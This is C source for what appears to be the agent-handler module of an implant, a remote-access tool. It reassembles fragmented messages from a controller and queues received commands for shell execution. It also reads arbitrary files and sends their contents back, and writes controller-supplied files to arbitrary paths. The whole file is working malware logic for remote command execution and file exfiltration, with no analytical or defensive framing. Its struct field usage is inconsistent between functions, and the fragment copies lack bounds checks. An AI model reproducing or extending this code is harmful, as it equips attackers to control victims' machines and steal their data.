#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <signal.h>

#include <arpa/inet.h>

#include "queue.h"
#include "implant.h"
#include "utility.h"
#include "agent_handler.h"

// Globals
extern Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
extern Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;
extern Queue* shell_receive_queue;
extern pthread_mutex_t shell_receive_queue_lock;
extern Queue* shell_send_queue;
extern pthread_mutex_t shell_send_queue_lock;
// SIGINT flags
extern volatile sig_atomic_t agent_close_flag;

STATIC int agent_handle_command(Assembled_Message* a_message){
	Queue_Message* message = malloc(sizeof(Queue_Message));
	memset(message, 0, sizeof(Queue_Message));
	
	message->size = a_message->total_message_size;
	message->buffer = a_message->complete_message;
	
	debug_print("%s\n", "enqueing command request");
	enqueue(shell_send_queue, &shell_send_queue_lock, message);

	return 0;
}

STATIC int agent_handle_put_file_name(Assembled_Message* a_message){

	a_message->file_name = a_message->complete_message;

	debug_print("Put file name: %s\n", a_message->file_name);

	return RET_OK;
}

STATIC int agent_handle_put_file(Assembled_Message* a_message){
	FILE* file_fd;

	if ((file_fd = fopen(a_message->file_name, "w")) == 0){
		printf("ERROR file open\n");
		return RET_ERROR;
	}

	if (fwrite(a_message->complete_message, 1, a_message->total_message_size, file_fd) < a_message->total_message_size){
		printf("ERROR fwrite\n");
		return RET_ERROR;
	}

	debug_print("Put file: %s, size: %d\n", a_message->file_name, a_message->total_message_size);

	free(a_message->complete_message);
	free(a_message->file_name);

	return RET_OK;
}

STATIC int agent_handle_get_file(Assembled_Message* a_message){
	FILE* file_fd;
	int file_size, bytes_read;
	char *file_buffer;

	if (access(a_message->complete_message, F_OK)){
		debug_print("%s\n", "File doesn't exist");
		//TODO send status message
	}

	if ((file_fd = fopen(a_message->complete_message, "r")) == 0){
		printf("ERROR file open\n");
		return RET_ERROR;
	}

	if (fseek(file_fd, 0L, SEEK_END) == -1){
		printf("ERROR fseek\n");
		return RET_ERROR;
	}
	if ((file_size = ftell(file_fd)) == -1){
		printf("ERROR ftell\n");
		return RET_ERROR;
	}
	rewind(file_fd);

	file_buffer = malloc(file_size);

	bytes_read = fread(file_buffer, 1, file_size, file_fd);
	if (bytes_read != file_size || ferror(file_fd)){
		printf("ERROR fread\n");
		return RET_ERROR;
	}
	
	fclose(file_fd);



	// file_name_size = strlen(buf);
	// file_name_buffer = malloc(file_name_size);
	// memcpy(file_name_buffer, buf, file_name_size);

	agent_prepare_message(TYPE_GET_FILE_NAME, a_message->complete_message, a_message->total_message_size);
	agent_prepare_message(TYPE_GET_FILE, file_buffer, file_size);

	debug_print("Get file: %s, size: %d\n", a_message->complete_message, file_size);

	return RET_OK;
}

STATIC int agent_parse_first_fragment(Queue_Message* q_message, Assembled_Message* a_message){
	Fragment* fragment = q_message->fragment;
	debug_print("Fragment: %d, %d, %d, %s\n", ntohl(fragment->type), ntohl(fragment->index), ntohl(fragment->first_payload.total_size), fragment->first_payload.actual_payload);
	
	// check if we are receiving the first index of a message
	if (ntohl(fragment->index) != 0){
		debug_print("Out of order: %d\n", ntohl(fragment->index));
		return RET_ERROR;
	}
	a_message->last_fragment_index = ntohl(fragment->index);
	
	// assign type
	a_message->type = ntohl(fragment->type);
	
	// get payload size
	a_message->total_message_size = ntohl(fragment->first_payload.total_size);
	
	// allocate memory and null
	a_message->complete_message = malloc(a_message->total_message_size);
	memset(a_message->complete_message, 0, a_message->total_message_size);
	
	// get the size of payload in this fragment
	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
	
	// copy payload (not including total message size) to message buffer
	memcpy(a_message->complete_message, fragment->first_payload.actual_payload, this_payload_size);
	
	// record current size of message
	a_message->current_message_size = this_payload_size;
	
	debug_print("first message: total_size: %d, current_message_size: %d, type: %d\n", a_message->total_message_size, a_message->current_message_size, a_message->type);
	
	free(q_message->fragment);
	free(q_message);
	return RET_OK;
}

STATIC int agent_parse_next_fragment(Queue_Message* q_message, Assembled_Message* a_message){
	Fragment* fragment = q_message->fragment;
	
	// check if we are receiving the next expected index of a message
	if (ntohl(fragment->index) != a_message->last_fragment_index + 1 || ntohl(fragment->type) != a_message->type){
		return RET_ERROR;
	}
	a_message->last_fragment_index = ntohl(fragment->index);
	
	// get the size of payload in this fragment
	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index);
	
	// copy payload to end of message buffer
	memcpy(a_message->complete_message + a_message->current_message_size, fragment->next_payload, this_payload_size);
	
	// update current size of message
	a_message->current_message_size += this_payload_size;
	
	debug_print("next message:\tcurrent_message_size: %d, type: %d\n", a_message->current_message_size, a_message->type);
	
	free(q_message->fragment);
	free(q_message);
	return RET_OK;
}

int agent_handle_message_fragment(Assembled_Message* a_message){
	int ret_val = RET_OK;
	Queue_Message* q_message;

	if ((q_message = dequeue(agent_receive_queue, &agent_receive_queue_lock))){
		debug_print("dequeued message size: %d\n", q_message->size);
		
		if (a_message->last_fragment_index == -1){
		
			int retval = agent_parse_first_fragment(q_message, a_message);
			if (retval != RET_OK){
				debug_print("%s\n", "first message out of order");
			}
		}
		else{
			int retval = agent_parse_next_fragment(q_message, a_message);
			if (retval != RET_OK){
				a_message->last_fragment_index = -1;
				debug_print("%s\n", "next message out of order");
			}
		}
	}
	
	return ret_val;
}

int agent_handle_complete_message(Assembled_Message* a_message){
	int ret_val = RET_OK;

	if (a_message->last_fragment_index != -1 && a_message->total_message_size == a_message->current_message_size){
		debug_print("received full message %d, %d, %s\n", a_message->type, a_message->total_message_size, a_message->complete_message);
		a_message->last_fragment_index = -1;
		if (a_message->type == TYPE_COMMAND){
			agent_handle_command(a_message);
		}
		else if (a_message->type == TYPE_GET_FILE_NAME){
			agent_handle_get_file(a_message);
		}
		else if (a_message->type == TYPE_PUT_FILE_NAME){
			agent_handle_put_file_name(a_message);
		}
		else if (a_message->type == TYPE_PUT_FILE){
			agent_handle_put_file(a_message);
		}
		else{
			printf("ERROR unknown fragment type\n");
			ret_val = RET_ERROR;
		}
	}
	
	return ret_val;
}

STATIC int agent_handle_message(Assembled_Message* a_message){
	
	if (agent_handle_message_fragment(a_message) != RET_OK){
		printf("ERROR agent_handle_message_fragment\n");
		return RET_ERROR;
	}
	
	if (agent_handle_complete_message(a_message) != RET_OK){
		printf("ERROR agent_handle_complete_message\n");
		return RET_ERROR;
	}

	return RET_OK;
}

int agent_prepare_message(int type, char* message, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0, index = 0;
	int this_size, next_size;

	// prepare first fragment. Only purpose is to prepare for next fragment size
	fragment = calloc(1, sizeof(Fragment));
	fragment->header.type = htonl(type);
	fragment->header.index = htonl(index++);
	fragment->header.total_size = htonl(message_size);
	fragment->header.checksum = 0;							// TODO
	
	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
	fragment->header.next_size = next_size;
	
	q_message = malloc(sizeof(Queue_Message));
	q_message->id = 0;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	enqueue(agent_send_queue, &agent_send_queue_lock, q_message);

	while (next_size > 0){
		this_size = next_size;

		// send remaining fragments
		fragment = calloc(1, sizeof(Fragment));
		fragment->header.type = htonl(type);
		fragment->header.index = htonl(index++);
		fragment->header.total_size = htonl(message_size);
		fragment->header.checksum = 0;							// TODO

		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
		fragment->header.next_size = next_size;
		memcpy(fragment->buffer, message + bytes_sent, this_size);
		
		q_message = malloc(sizeof(Queue_Message));
		q_message->id = 0;
		q_message->size = HEADER_SIZE + this_size;
		q_message->fragment = fragment;

		enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
		bytes_sent += this_size;
	}
	
	free(message);
	return RET_OK;	
}

void *agent_handler_thread(void *vargp){
	Assembled_Message assembled_message = {0};
	assembled_message.last_fragment_index = -1;

	while(!agent_close_flag){
		if (agent_handle_message(&assembled_message) != RET_OK){
			printf("agent_handler_thread error\n");
			agent_close_flag = true;
		}
	}

	debug_print("%s\n", "agent_handler_thread done");
	return 0;
}